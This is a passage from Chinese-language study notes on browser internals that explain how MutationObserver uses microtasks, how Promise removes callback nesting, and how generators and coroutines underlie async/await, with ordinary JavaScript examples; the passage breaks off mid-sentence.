变化后，<strong>一次触发异步调用</strong>，并且还会使用一个数据结构来记录这期间所有的 DOM 变化。这样即使频繁地操纵 DOM，也不会对性能造成太大的影响。</p><p>我们通过异步调用和减少触发次数来缓解了性能问题，那么如何保持消息通知的及时性呢？如果采用 setTimeout 创建宏任务来触发回调的话，那么实时性就会大打折扣，因为上面我们分析过，在两个任务之间，可能会被渲染进程插入其他的事件，从而影响到响应的实时性。</p><p>这时候，<strong>微任务</strong>就可以上场了，在每次 DOM 节点发生变化的时候，渲染引擎将变化记录封装成微任务，并将微任务添加进当前的微任务队列中。这样当执行到检查点的时候，V8 引擎就会按照顺序执行微任务了。</p><p>综上所述， MutationObserver 采用了“<strong>异步 + 微任务</strong>”的策略。</p><ul><li>通过<strong>异步</strong>操作解决了同步操作的<strong>性能问题</strong>；</li><li>通过<strong>微任务</strong>解决了<strong>实时性的问题</strong>。</li></ul><h3 id="总结-17"><a href="#总结-17" class="headerlink" title="总结"></a>总结</h3><p>好了，今天就介绍到这里，下面我来总结下今天的内容。</p><p>首先我们回顾了宏任务，然后在宏任务的基础之上，我们分析了异步回调函数的两种形式，其中最后一种回调的方式就是通过微任务来实现的。</p><p>接下来我们详细分析了浏览器是如何实现微任务的，包括微任务队列、检查点等概念。</p><p>最后我们介绍了监听 DOM 变化技术方案的演化史，从轮询到 Mutation Event 再到最新使用的 MutationObserver。MutationObserver 方案的核心就是采用了微任务机制，有效地权衡了实时性和执行效率的问题。</p><h2 id="5-Promise：使用-Promise，告别回调函数"><a href="#5-Promise：使用-Promise，告别回调函数" class="headerlink" title="5. Promise：使用 Promise，告别回调函数"></a>5. Promise：使用 Promise，告别回调函数</h2><p>在<a href="https://time.geekbang.org/column/article/135624">上一篇文章</a>中我们聊到了微任务是如何工作的，并介绍了 MutationObserver 是如何利用微任务来权衡性能和效率的。今天我们就接着来聊聊微任务的另外一个应用<strong>Promise</strong>，DOM&#x2F;BOM API 中新加入的 API 大多数都是建立在 Promise 上的，而且新的前端框架也使用了大量的 Promise。可以这么说，Promise 已经成为现代前端的“水”和“电”，很是关键，所以深入学习 Promise 势在必行。</p><p>不过，Promise 的知识点有那么多，而我们只有一篇文章来介绍，那应该怎么讲解呢？具体讲解思路是怎样的呢？</p><p>如果你想要学习一门新技术，最好的方式是先了解这门技术是如何诞生的，以及它所解决的问题是什么。了解了这些后，你才能抓住这门技术的本质。所以本文我们就来重点聊聊 JavaScript 引入 Promise 的动机，以及解决问题的几个核心关键点。</p><p>要谈动机，我们一般都是先从问题切入，那么 Promise 到底解决了什么问题呢？在正式开始介绍之前，我想有必要明确下，Promise 解决的是异步编码风格的问题，而不是一些其他的问题，所以接下来我们聊的话题都是围绕编码风格展开的。</p><h3 id="异步编程的问题：代码逻辑不连续"><a href="#异步编程的问题：代码逻辑不连续" class="headerlink" title="异步编程的问题：代码逻辑不连续"></a>异步编程的问题：代码逻辑不连续</h3><p>首先我们来回顾下 JavaScript 的异步编程模型，你应该已经非常熟悉页面的事件循环系统了，也知道页面中任务都是执行在主线程之上的，相对于页面来说，主线程就是它整个的世界，所以在执行一项耗时的任务时，比如下载网络文件任务、获取摄像头等设备信息任务，这些任务都会放到页面主线程之外的进程或者线程中去执行，这样就避免了耗时任务“霸占”页面主线程的情况。你可以结合下图来看看这个处理过程：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014221627295.png" alt="image-20221014221627295"></p><p>上图展示的是一个标准的异步编程模型，页面主线程发起了一个耗时的任务，并将任务交给另外一个进程去处理，这时页面主线程会继续执行消息队列中的任务。等该进程处理完这个任务后，会将该任务添加到渲染进程的消息队列中，并排队等待循环系统的处理。排队结束之后，循环系统会取出消息队列中的任务进行处理，并触发相关的回调操作。</p><p>这就是页面编程的一大特点：<strong>异步回调</strong>。</p><p>Web 页面的单线程架构决定了异步回调，而异步回调影响到了我们的编码方式，到底是如何影响的呢？</p><p>假设有一个下载的需求，使用 XMLHttpRequest 来实现，具体的实现方式你可以参考下面这段代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 执行状态</span><br><span class="line">function onResolve(response)&#123;console.log(response) &#125;</span><br><span class="line">function onReject(error)&#123;console.log(error) &#125;</span><br><span class="line"></span><br><span class="line">let xhr = new XMLHttpRequest()</span><br><span class="line">xhr.ontimeout = function(e) &#123; onReject(e)&#125;</span><br><span class="line">xhr.onerror = function(e) &#123; onReject(e) &#125;</span><br><span class="line">xhr.onreadystatechange = function () &#123; onResolve(xhr.response) &#125;</span><br><span class="line"></span><br><span class="line">// 设置请求类型，请求 URL，是否同步信息</span><br><span class="line">let URL = &#x27;https://time.geekbang.com&#x27;</span><br><span class="line">xhr.open(&#x27;Get&#x27;, URL, true);</span><br><span class="line"></span><br><span class="line">// 设置参数</span><br><span class="line">xhr.timeout = 3000 // 设置 xhr 请求的超时时间</span><br><span class="line">xhr.responseType = &quot;text&quot; // 设置响应返回的数据格式</span><br><span class="line">xhr.setRequestHeader(&quot;X_TEST&quot;,&quot;time.geekbang&quot;)</span><br><span class="line"></span><br><span class="line">// 发出请求</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure><p>我们执行上面这段代码，可以正常输出结果的。但是，这短短的一段代码里面竟然出现了五次回调，这么多的回调会导致代码的逻辑不连贯、不线性，非常不符合人的直觉，这就是异步回调影响到我们的编码方式。</p><p>那有什么方法可以解决这个问题吗？当然有，我们可以封装这堆凌乱的代码，降低处理异步回调的次数。</p><h3 id="封装异步代码，让处理流程变得线性"><a href="#封装异步代码，让处理流程变得线性" class="headerlink" title="封装异步代码，让处理流程变得线性"></a>封装异步代码，让处理流程变得线性</h3><p>由于我们重点关注的是<strong>输入内容（请求信息）**和**输出内容（回复信息）</strong>，至于中间的异步请求过程，我们不想在代码里面体现太多，因为这会干扰核心的代码逻辑。整体思路如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014221637347.png" alt="image-20221014221637347"></p><p>从图中你可以看到，我们将 XMLHttpRequest 请求过程的代码封装起来了，重点关注输入数据和输出结果。</p><p>那我们就按照这个思路来改造代码。首先，我们把输入的 HTTP 请求信息全部保存到一个 request 的结构中，包括请求地址、请求头、请求方式、引用地址、同步请求还是异步请求、安全设置等信息。request 结构如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//makeRequest 用来构造 request 对象</span><br><span class="line">function makeRequest(request_url) &#123;</span><br><span class="line">    let request = &#123;</span><br><span class="line">        method: &#x27;Get&#x27;,</span><br><span class="line">        url: request_url,</span><br><span class="line">        headers: &#x27;&#x27;,</span><br><span class="line">        body: &#x27;&#x27;,</span><br><span class="line">        credentials: false,</span><br><span class="line">        sync: true,</span><br><span class="line">        responseType: &#x27;text&#x27;,</span><br><span class="line">        referrer: &#x27;&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    return request</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就可以封装请求过程了，这里我们将所有的请求细节封装进 XFetch 函数，XFetch 代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//[in] request，请求信息，请求头，延时值，返回类型等</span><br><span class="line">//[out] resolve, 执行成功，回调该函数</span><br><span class="line">//[out] reject  执行失败，回调该函数</span><br><span class="line">function XFetch(request, resolve, reject) &#123;</span><br><span class="line">    let xhr = new XMLHttpRequest()</span><br><span class="line">    xhr.ontimeout = function (e) &#123; reject(e) &#125;</span><br><span class="line">    xhr.onerror = function (e) &#123; reject(e) &#125;</span><br><span class="line">    xhr.onreadystatechange = function () &#123;</span><br><span class="line">        if (xhr.status = 200)</span><br><span class="line">            resolve(xhr.response)</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.open(request.method, URL, request.sync);</span><br><span class="line">    xhr.timeout = request.timeout;</span><br><span class="line">    xhr.responseType = request.responseType;</span><br><span class="line">    // 补充其他请求信息</span><br><span class="line">    //...</span><br><span class="line">    xhr.send();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个 XFetch 函数需要一个 request 作为输入，然后还需要两个回调函数 resolve 和 reject，当请求成功时回调 resolve 函数，当请求出现问题时回调 reject 函数。</p><p>有了这些后，我们就可以来实现业务代码了，具体的实现方式如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XFetch(makeRequest(&#x27;https://time.geekbang.org&#x27;),</span><br><span class="line">    function resolve(data) &#123;</span><br><span class="line">        console.log(data)</span><br><span class="line">    &#125;, function reject(e) &#123;</span><br><span class="line">        console.log(e)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><h3 id="新的问题：回调地狱"><a href="#新的问题：回调地狱" class="headerlink" title="新的问题：回调地狱"></a>新的问题：回调地狱</h3><p>上面的示例代码已经比较符合人的线性思维了，在一些简单的场景下运行效果也是非常好的，不过一旦接触到稍微复杂点的项目时，你就会发现，如果嵌套了太多的回调函数就很容易使得自己陷入了<strong>回调地狱</strong>，不能自拔。你可以参考下面这段让人凌乱的代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XFetch(makeRequest(&#x27;https://time.geekbang.org/?category&#x27;),</span><br><span class="line">      function resolve(response) &#123;</span><br><span class="line">          console.log(response)</span><br><span class="line">          XFetch(makeRequest(&#x27;https://time.geekbang.org/column&#x27;),</span><br><span class="line">              function resolve(response) &#123;</span><br><span class="line">                  console.log(response)</span><br><span class="line">                  XFetch(makeRequest(&#x27;https://time.geekbang.org&#x27;)</span><br><span class="line">                      function resolve(response) &#123;</span><br><span class="line">                          console.log(response)</span><br><span class="line">                      &#125;, function reject(e) &#123;</span><br><span class="line">                          console.log(e)</span><br><span class="line">                      &#125;)</span><br><span class="line">              &#125;, function reject(e) &#123;</span><br><span class="line">                  console.log(e)</span><br><span class="line">              &#125;)</span><br><span class="line">      &#125;, function reject(e) &#123;</span><br><span class="line">          console.log(e)</span><br><span class="line">      &#125;)</span><br></pre></td></tr></table></figure><p>这段代码是先请求<code>time.geekbang.org/?category</code>，如果请求成功的话，那么再请求<code>time.geekbang.org/column</code>，如果再次请求成功的话，就继续请求<code>time.geekbang.org</code>。也就是说这段代码用了三层嵌套请求，就已经让代码变得混乱不堪，所以，我们还需要解决这种嵌套调用后混乱的代码结构。</p><p>这段代码之所以看上去很乱，归结其原因有两点：</p><ul><li><strong>第一是嵌套调用</strong>，下面的任务依赖上个任务的请求结果，并<strong>在上个任务的回调函数内部执行新的业务逻辑</strong>，这样当嵌套层次多了之后，代码的可读性就变得非常差了。</li><li><strong>第二是任务的不确定性</strong>，执行每个任务都有两种可能的结果（成功或者失败），所以体现在代码中就需要对每个任务的执行结果做两次判断，这种对每个任务都要进行一次额外的错误处理的方式，明显增加了代码的混乱程度。</li></ul><p>原因分析出来后，那么问题的解决思路就很清晰了：</p><ul><li><strong>第一是消灭嵌套调用</strong>；</li><li><strong>第二是合并多个任务的错误处理</strong>。</li></ul><p>这么讲可能有点抽象，不过 Promise 已经帮助我们解决了这两个问题。那么接下来我们就来看看 Promise 是怎么消灭嵌套调用和合并多个任务的错误处理的。</p><h3 id="Promise：消灭嵌套调用和多次错误处理"><a href="#Promise：消灭嵌套调用和多次错误处理" class="headerlink" title="Promise：消灭嵌套调用和多次错误处理"></a>Promise：消灭嵌套调用和多次错误处理</h3><p>首先，我们使用 Promise 来重构 XFetch 的代码，示例代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function XFetch(request) &#123;</span><br><span class="line">  function executor(resolve, reject) &#123;</span><br><span class="line">      let xhr = new XMLHttpRequest()</span><br><span class="line">      xhr.open(&#x27;GET&#x27;, request.url, true)</span><br><span class="line">      xhr.ontimeout = function (e) &#123; reject(e) &#125;</span><br><span class="line">      xhr.onerror = function (e) &#123; reject(e) &#125;</span><br><span class="line">      xhr.onreadystatechange = function () &#123;</span><br><span class="line">          if (this.readyState === 4) &#123;</span><br><span class="line">              if (this.status === 200) &#123;</span><br><span class="line">                  resolve(this.responseText, this)</span><br><span class="line">              &#125; else &#123;</span><br><span class="line">                  let error = &#123;</span><br><span class="line">                      code: this.status,</span><br><span class="line">                      response: this.response</span><br><span class="line">                  &#125;</span><br><span class="line">                  reject(error, this)</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      xhr.send()</span><br><span class="line">  &#125;</span><br><span class="line">  return new Promise(executor)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来，我们再利用 XFetch 来构造请求流程，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var x1 = XFetch(makeRequest(&#x27;https://time.geekbang.org/?category&#x27;))</span><br><span class="line">var x2 = x1.then(value =&gt; &#123;</span><br><span class="line">    console.log(value)</span><br><span class="line">    return XFetch(makeRequest(&#x27;https://www.geekbang.org/column&#x27;))</span><br><span class="line">&#125;)</span><br><span class="line">var x3 = x2.then(value =&gt; &#123;</span><br><span class="line">    console.log(value)</span><br><span class="line">    return XFetch(makeRequest(&#x27;https://time.geekbang.org&#x27;))</span><br><span class="line">&#125;)</span><br><span class="line">x3.catch(error =&gt; &#123;</span><br><span class="line">    console.log(error)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>你可以观察上面这两段代码，重点关注下 Promise 的使用方式。</p><ul><li>首先我们引入了 Promise，在调用 XFetch 时，会返回一个 Promise 对象。</li><li>构建 Promise 对象时，需要传入一个<strong>executor 函数</strong>，XFetch 的主要业务流程都在 executor 函数中执行。</li><li>如果运行在 excutor 函数中的业务执行成功了，会调用 resolve 函数；如果执行失败了，则调用 reject 函数。</li><li>在 excutor 函数中调用 resolve 函数时，会触发 promise.then 设置的回调函数；而调用 reject 函数时，会触发 promise.catch 设置的回调函数。</li></ul><p>以上简单介绍了 Promise 一些主要的使用方法，通过引入 Promise，上面这段代码看起来就非常线性了，也非常符合人的直觉，是不是很酷？基于这段代码，我们就可以来分析 Promise 是如何消灭嵌套回调和合并多个错误处理了。</p><p>我们先来看看 Promise 是怎么消灭嵌套回调的。产生嵌套函数的一个主要原因是在发起任务请求时会带上回调函数，这样当任务处理结束之后，下个任务就只能在回调函数中来处理了。</p><p>Promise 主要通过下面两步解决嵌套回调问题的。</p><p><strong>首先，Promise 实现了回调函数的延时绑定</strong>。回调函数的延时绑定在代码上体现就是先创建 Promise 对象 x1，通过 Promise 的构造函数 executor 来执行业务逻辑；创建好 Promise 对象 x1 之后，再使用 x1.then 来设置回调函数。示范代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 创建 Promise 对象 x1，并在 executor 函数中执行业务逻辑</span><br><span class="line">function executor(resolve, reject)&#123;</span><br><span class="line">    resolve(100)</span><br><span class="line">&#125;</span><br><span class="line">let x1 = new Promise(executor)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//x1 延迟绑定回调函数 onResolve</span><br><span class="line">function onResolve(value)&#123;</span><br><span class="line">    console.log(value)</span><br><span class="line">&#125;</span><br><span class="line">x1.then(onResolve)</span><br></pre></td></tr></table></figure><p><strong>其次，需要将回调函数 onResolve 的返回值穿透到最外层</strong>。因为我们会根据 onResolve 函数的传入值来决定创建什么类型的 Promise 任务，创建好的 Promise 对象需要返回到最外层，这样就可以摆脱嵌套循环了。你可以先看下面的代码：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014221654119.png" alt="image-20221014221654119"></p><p>现在我们知道了 Promise 通过回调函数延迟绑定和回调函数返回值穿透的技术，解决了循环嵌套。</p><p>那接下来我们再来看看 Promise 是怎么处理异常的，你可以回顾<a href="https://time.geekbang.org/column/article/135624">上篇文章</a>思考题留的那段代码，我把这段代码也贴在文中了，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function executor(resolve, reject) &#123;</span><br><span class="line">    let rand = Math.random();</span><br><span class="line">    console.log(1)</span><br><span class="line">    console.log(rand)</span><br><span class="line">    if (rand &gt; 0.5)</span><br><span class="line">        resolve()</span><br><span class="line">    else</span><br><span class="line">        reject()</span><br><span class="line">&#125;</span><br><span class="line">var p0 = new Promise(executor);</span><br><span class="line"></span><br><span class="line">var p1 = p0.then((value) =&gt; &#123;</span><br><span class="line">    console.log(&quot;succeed-1&quot;)</span><br><span class="line">    return new Promise(executor)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">var p3 = p1.then((value) =&gt; &#123;</span><br><span class="line">    console.log(&quot;succeed-2&quot;)</span><br><span class="line">    return new Promise(executor)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">var p4 = p3.then((value) =&gt; &#123;</span><br><span class="line">    console.log(&quot;succeed-3&quot;)</span><br><span class="line">    return new Promise(executor)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">p4.catch((error) =&gt; &#123;</span><br><span class="line">    console.log(&quot;error&quot;)</span><br><span class="line">&#125;)</span><br><span class="line">console.log(2)</span><br></pre></td></tr></table></figure><p>这段代码有四个 Promise 对象：p0 ～ p4。无论哪个对象里面抛出异常，都可以通过最后一个对象 p4.catch 来捕获异常，通过这种方式可以将所有 Promise 对象的错误合并到一个函数来处理，这样就解决了每个任务都需要单独处理异常的问题。</p><p>之所以可以使用最后一个对象来捕获所有异常，是因为 Promise 对象的错误具有“冒泡”性质，会一直向后传递，直到被 onReject 函数处理或 catch 语句捕获为止。具备了这样“冒泡”的特性后，就不需要在每个 Promise 对象中单独捕获异常了。至于 Promise 错误的“冒泡”性质是怎么实现的，就留给你课后思考了。</p><p>通过这种方式，我们就消灭了嵌套调用和频繁的错误处理，这样使得我们写出来的代码更加优雅，更加符合人的线性思维。</p><h3 id="Promise-与微任务"><a href="#Promise-与微任务" class="headerlink" title="Promise 与微任务"></a>Promise 与微任务</h3><p>讲了这么多，我们似乎还没有将微任务和 Promise 关联起来，那么 Promise 和微任务的关系到底体现哪里呢？</p><p>我们可以结合下面这个简单的 Promise 代码来回答这个问题：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function executor(resolve, reject) &#123;</span><br><span class="line">    resolve(100)</span><br><span class="line">&#125;</span><br><span class="line">let demo = new Promise(executor)</span><br><span class="line"></span><br><span class="line">function onResolve(value)&#123;</span><br><span class="line">    console.log(value)</span><br><span class="line">&#125;</span><br><span class="line">demo.then(onResolve)</span><br></pre></td></tr></table></figure><p>对于上面这段代码，我们需要重点关注下它的执行顺序。</p><p>首先执行 new Promise 时，Promise 的构造函数会被执行，不过由于 Promise 是 V8 引擎提供的，所以暂时看不到 Promise 构造函数的细节。</p><p>接下来，Promise 的构造函数会调用 Promise 的参数 executor 函数。然后在 executor 中执行了 resolve，resolve 函数也是在 V8 内部实现的，那么 resolve 函数到底做了什么呢？我们知道，执行 resolve 函数，会触发 demo.then 设置的回调函数 onResolve，所以可以推测，resolve 函数内部调用了通过 demo.then 设置的 onResolve 函数。</p><p>不过这里需要注意一下，由于 Promise 采用了回调函数延迟绑定技术，所以在执行 resolve 函数的时候，回调函数还没有绑定，那么只能推迟回调函数的执行。</p><p>这样按顺序陈述可能把你绕晕了，下面来模拟实现一个 Promise，我们会实现它的构造函数、resolve 方法以及 then 方法，以方便你能看清楚 Promise 的背后都发生了什么。这里我们就把这个对象称为 Bromise，下面就是 Bromise 的实现代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function Bromise(executor) &#123;</span><br><span class="line">    var onResolve_ = null</span><br><span class="line">    var onReject_ = null</span><br><span class="line">     // 模拟实现 resolve 和 then，暂不支持 rejcet</span><br><span class="line">    this.then = function (onResolve, onReject) &#123;</span><br><span class="line">        onResolve_ = onResolve</span><br><span class="line">    &#125;;</span><br><span class="line">    function resolve(value) &#123;</span><br><span class="line">          //setTimeout(()=&gt;&#123;</span><br><span class="line">            onResolve_(value)</span><br><span class="line">           // &#125;,0)</span><br><span class="line">    &#125;</span><br><span class="line">    executor(resolve, null);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察上面这段代码，我们实现了自己的构造函数、resolve、then 方法。接下来我们使用 Bromise 来实现我们的业务代码，实现后的代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function executor(resolve, reject) &#123;</span><br><span class="line">    resolve(100)</span><br><span class="line">&#125;</span><br><span class="line">// 将 Promise 改成我们自己的 Bromsie</span><br><span class="line">let demo = new Bromise(executor)</span><br><span class="line"></span><br><span class="line">function onResolve(value)&#123;</span><br><span class="line">    console.log(value)</span><br><span class="line">&#125;</span><br><span class="line">demo.then(onResolve)</span><br></pre></td></tr></table></figure><p>执行这段代码，我们发现执行出错，输出的内容是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Uncaught TypeError: onResolve_ is not a function</span><br><span class="line">    at resolve (&lt;anonymous&gt;:10:13)</span><br><span class="line">    at executor (&lt;anonymous&gt;:17:5)</span><br><span class="line">    at new Bromise (&lt;anonymous&gt;:13:5)</span><br><span class="line">    at &lt;anonymous&gt;:19:12</span><br></pre></td></tr></table></figure><p>之所以出现这个错误，是由于 Bromise 的延迟绑定导致的，在调用到 onResolve* 函数的时候，Bromise.then 还没有执行，所以执行上述代码的时候，当然会报“onResolve* is not a function“的错误了。</p><p>也正是因为此，我们要改造 Bromise 中的 resolve 方法，让 resolve 延迟调用 onResolve_。</p><p>要让 resolve 中的 onResolve* 函数延后执行，可以在 resolve 函数里面加上一个定时器，让其延时执行 onResolve* 函数，你可以参考下面改造后的代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function resolve(value) &#123;</span><br><span class="line">          setTimeout(()=&gt;&#123;</span><br><span class="line">              onResolve_(value)</span><br><span class="line">            &#125;,0)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>上面采用了定时器来推迟 onResolve 的执行，不过使用定时器的效率并不是太高，好在我们有微任务，所以 Promise 又把这个定时器改造成了微任务了，这样既可以让 onResolve_ 延时被调用，又提升了代码的执行效率。这就是 Promise 中使用微任务的原由了。</p><h3 id="总结-18"><a href="#总结-18" class="headerlink" title="总结"></a>总结</h3><p>好了，今天我们就聊到这里，下面我来总结下今天所讲的内容。</p><p>首先，我们回顾了 Web 页面是单线程架构模型，这种模型决定了我们编写代码的形式——异步编程。基于异步编程模型写出来的代码会把一些关键的逻辑点打乱，所以这种风格的代码不符合人的线性思维方式。接下来我们试着把一些不必要的回调接口封装起来，简单封装取得了一定的效果，不过，在稍微复制点的场景下依然存在着回调地狱的问题。然后我们分析了产生回调地狱的原因：</p><ol><li>多层嵌套的问题；</li><li>每种任务的处理结果存在两种可能性（成功或失败），那么需要在每种任务执行结束后分别处理这两种可能性。</li></ol><p>Promise 通过回调函数延迟绑定、回调函数返回值穿透和错误“冒泡”技术解决了上面的两个问题。</p><p>最后，我们还分析了 Promise 之所以要使用微任务是由 Promise 回调函数延迟绑定技术导致的。</p><h2 id="6-async-x2F-await：使用同步的方式去写异步代码"><a href="#6-async-x2F-await：使用同步的方式去写异步代码" class="headerlink" title="6. async&#x2F;await：使用同步的方式去写异步代码"></a>6. async&#x2F;await：使用同步的方式去写异步代码</h2><p>在<a href="https://time.geekbang.org/column/article/136895">上篇文章</a>中，我们介绍了怎么使用 Promise 来实现回调操作，使用 Promise 能很好地解决回调地狱的问题，但是这种方式充满了 Promise 的 then() 方法，如果处理流程比较复杂的话，那么整段代码将充斥着 then，语义化不明显，代码不能很好地表示执行流程。</p><p>比如下面这样一个实际的使用场景：我先请求极客邦的内容，等返回信息之后，我再请求极客邦的另外一个资源。下面代码展示的是使用 fetch 来实现这样的需求，fetch 被定义在 window 对象中，可以用它来发起对远程资源的请求，该方法返回的是一个 Promise 对象，这和我们上篇文章中讲的 XFetch 很像，只不过 fetch 是浏览器原生支持的，并有没利用 XMLHttpRequest 来封装。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fetch(&#x27;https://www.geekbang.org&#x27;)</span><br><span class="line">      .then((response) =&gt; &#123;</span><br><span class="line">          console.log(response)</span><br><span class="line">          return fetch(&#x27;https://www.geekbang.org/test&#x27;)</span><br><span class="line">      &#125;).then((response) =&gt; &#123;</span><br><span class="line">          console.log(response)</span><br><span class="line">      &#125;).catch((error) =&gt; &#123;</span><br><span class="line">          console.log(error)</span><br><span class="line">      &#125;)</span><br></pre></td></tr></table></figure><p>从这段 Promise 代码可以看出来，使用 promise.then 也是相当复杂，虽然整个请求流程已经线性化了，但是代码里面包含了大量的 then 函数，使得代码依然不是太容易阅读。<strong>基于这个原因，ES7 引入了 async&#x2F;await，这是 JavaScript 异步编程的一个重大改进，提供了在不阻塞主线程的情况下使用同步代码实现异步访问资源的能力，并且使得代码逻辑更加清晰</strong>。你可以参考下面这段代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">async function foo()&#123;</span><br><span class="line">  try&#123;</span><br><span class="line">    let response1 = await fetch(&#x27;https://www.geekbang.org&#x27;)</span><br><span class="line">    console.log(&#x27;response1&#x27;)</span><br><span class="line">    console.log(response1)</span><br><span class="line">    let response2 = await fetch(&#x27;https://www.geekbang.org/test&#x27;)</span><br><span class="line">    console.log(&#x27;response2&#x27;)</span><br><span class="line">    console.log(response2)</span><br><span class="line">  &#125;catch(err) &#123;</span><br><span class="line">       console.error(err)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">foo()</span><br></pre></td></tr></table></figure><p>通过上面代码，你会发现整个异步处理的逻辑都是使用同步代码的方式来实现的，而且还支持 try catch 来捕获异常，这就是完全在写同步代码，所以是非常符合人的线性思维的。但是很多人都习惯了异步回调的编程思维，对于这种采用同步代码实现异步逻辑的方式，还需要一个转换的过程，因为这中间隐藏了一些容易让人迷惑的细节。</p><p>那么本篇文章我们继续深入，看看 JavaScript 引擎是如何实现 async&#x2F;await 的。如果上来直接介绍 async&#x2F;await 的使用方式的话，那么你可能会有点懵，所以我们就从其最底层的技术点一步步往上讲解，从而带你彻底弄清楚 async 和 await 到底是怎么工作的。</p><p>本文我们首先介绍生成器（Generator）是如何工作的，接着讲解 Generator 的底层实现机制——协程（Coroutine）；又因为 async&#x2F;await 使用了 Generator 和 Promise 两种技术，所以紧接着我们就通过 Generator 和 Promise 来分析 async&#x2F;await 到底是如何以同步的方式来编写异步代码的。</p><h3 id="生成器-VS-协程"><a href="#生成器-VS-协程" class="headerlink" title="生成器 VS 协程"></a>生成器 VS 协程</h3><p>我们先来看看什么是生成器函数？</p><p><strong>生成器函数是一个带星号函数，而且是可以暂停执行和恢复执行的</strong>。我们可以看下面这段代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function* genDemo() &#123;</span><br><span class="line">    console.log(&quot; 开始执行第一段 &quot;)</span><br><span class="line">    yield &#x27;generator 2&#x27;</span><br><span class="line"></span><br><span class="line">    console.log(&quot; 开始执行第二段 &quot;)</span><br><span class="line">    yield &#x27;generator 2&#x27;</span><br><span class="line"></span><br><span class="line">    console.log(&quot; 开始执行第三段 &quot;)</span><br><span class="line">    yield &#x27;generator 2&#x27;</span><br><span class="line"></span><br><span class="line">    console.log(&quot; 执行结束 &quot;)</span><br><span class="line">    return &#x27;generator 2&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(&#x27;main 0&#x27;)</span><br><span class="line">let gen = genDemo()</span><br><span class="line">console.log(gen.next().value)</span><br><span class="line">console.log(&#x27;main 1&#x27;)</span><br><span class="line">console.log(gen.next().value)</span><br><span class="line">console.log(&#x27;main 2&#x27;)</span><br><span class="line">console.log(gen.next().value)</span><br><span class="line">console.log(&#x27;main 3&#x27;)</span><br><span class="line">console.log(gen.next().value)</span><br><span class="line">console.log(&#x27;main 4&#x27;)</span><br></pre></td></tr></table></figure><p>执行上面这段代码，观察输出结果，你会发现函数 genDemo 并不是一次执行完的，全局代码和 genDemo 函数交替执行。其实这就是生成器函数的特性，可以暂停执行，也可以恢复执行。下面我们就来看看生成器函数的具体使用方式：</p><ol><li>在生成器函数内部执行一段代码，如果遇到 yield 关键字，那么 JavaScript 引擎将返回关键字后面的内容给外部，并暂停该函数的执行。</li><li>外部函数可以通过 next 方法恢复函数的执行。</li></ol><p>关于函数的暂停和恢复，相信你一定很好奇这其中的原理，那么接下来我们就来简单介绍下 JavaScript 引擎 V8 是如何实现一个函数的暂停和恢复的，这也会有助于你理解后面要介绍的 async&#x2F;await。</p><p>要搞懂函数为何能暂停和恢复，那你首先要了解协程的概念。<strong>协程是一种比线程更加轻量级的存在</strong>。你可以把协程看成是跑在线程上的任务，一个线程上可以存在多个协程，但是在线程上同时只能执行一个协程，比如当前执行的是 A 协程，要启动 B 协程，那么 A 协程就需要将主线程的控制权交给 B 协程，这就体现在 A 协程暂停执行，B 协程恢复执行；同样，也可以从 B 协程中启动 A 协程。通常，<strong>如果从 A 协程启动 B 协程，我们就把 A 协程称为 B 协程的父协程</strong>。</p><p>正如一个进程可以拥有多个线程一样，一个线程也可以拥有多个协程。最重要的是，协程不是被操作系统内核所管理，而完全是由程序所控制（也就是在用户态执行）。这样带来的好处就是性能得到了很大的提升，不会像线程切换那样消耗资源。</p><p>为了让你更好地理解协程是怎么执行的，我结合上面那段代码的执行过程，画出了下面的“协程执行流程图”，你可以对照着代码来分析：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014221727146.png" alt="image-20221014221727146"></p><p>从图中可以看出来协程的四点规则：</p><ol><li>通过调用生成器函数 genDemo 来创建一个协程 gen，创建之后，gen 协程并没有立即执行。</li><li>要让 gen 协程执行，需要通过调用 gen.next。</li><li>当协程正在执行的时候，可以通过 yield 关键字来暂停 gen 协程的执行，并返回主要信息给父协程。</li><li>如果协程在执行期间，遇到了 return 